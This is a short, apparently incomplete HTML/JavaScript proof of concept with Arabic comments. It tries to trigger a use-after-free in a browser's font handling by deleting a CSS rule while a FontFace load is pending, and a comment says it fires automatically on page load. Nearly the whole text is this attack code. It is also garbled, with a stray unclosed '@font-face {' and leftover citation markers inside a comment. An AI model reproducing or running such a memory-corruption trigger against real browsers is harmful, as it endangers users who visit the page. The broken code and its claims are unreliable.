        @font-face {

    <script>
        async function triggerUAF() {
            // الوصول إلى مستند الخطوط
            const fontFaceSet = document.fonts;
            
            // إنشاء كائن FontFace
            const font = new FontFace("ExploitFont", "url(trigger.woff2)");
            fontFaceSet.add(font);

            // بدء التحميل غير المتزامن
            const loadPromise = font.load();

            // استغلال الثغرة عبر إعادة التفاعل (Re-entrancy)
            // حذف القاعدة أثناء انتظار اكتمال الـ Promise
            try {
                const styleSheet = document.getElementById('target-style').sheet;
                styleSheet.deleteRule(0); [span_6](start_span)// هذا الإجراء يحفز تحرير كائن CSSFontFace[span_6](end_span)
                
                await loadPromise;
            } catch (e) {
                console.error("تم تنفيذ إجراء الاستغلال، تحقق من حالة الذاكرة: ", e);
            }
        }

        // تشغيل الثغرة تلقائياً عند تحميل الصفحة
